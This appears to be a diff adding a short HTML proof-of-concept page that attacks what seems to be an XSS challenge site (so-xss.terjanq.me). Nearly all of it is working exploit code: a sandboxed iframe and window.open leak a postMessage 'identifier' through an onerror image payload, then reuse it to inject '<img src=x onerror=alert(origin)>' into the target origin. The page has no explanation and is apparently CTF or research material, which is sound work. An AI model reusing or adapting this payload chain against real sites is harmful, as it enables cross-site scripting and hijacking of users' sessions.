@@ -1,0 +1,53 @@
+
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>test</title>
+  </head>
+  <body>
+    <iframe id=f sandbox="allow-scripts allow-top-navigation allow-forms allow-modals allow-popups" srcdoc="<button onclick=run()>click me 1</button><script>
+      function run() {
+        var win = window.open('https://so-xss.terjanq.me/iframe.php')
+        setTimeout(() => {
+          win.postMessage({
+                identifier: 'abc',
+                type: 'render',
+                body: `<img src=x onerror=opener.top.postMessage({identifier},'*')>`,
+            }, '*');
+        }, 2000)
+      }
+    </script>"></iframe><button onclick="run()">click me 2</button>
+    <script>
+      var realWin
+      var identifier
+
+      function send() {
+        if (!realWin) {
+          setTimeout(send, 500)
+          return
+        }
+
+        // give it some time to load
+        setTimeout(() => {
+          realWin.postMessage({
+            identifier,
+            type: 'render',
+            body: `<img src=x onerror=alert(origin)>`,
+          }, '*');
+        }, 1000)
+        
+      }
+      onmessage = (e) => {
+        if (e.data && e.data.identifier) {
+          identifier = e.data.identifier
+          console.log('identifier:', identifier)
+          send()
+        }
+      }
+      function run() {
+        realWin = window.open('https://so-xss.terjanq.me/iframe.php')
+      }
+
+    </script>
+  </body>
+</html>
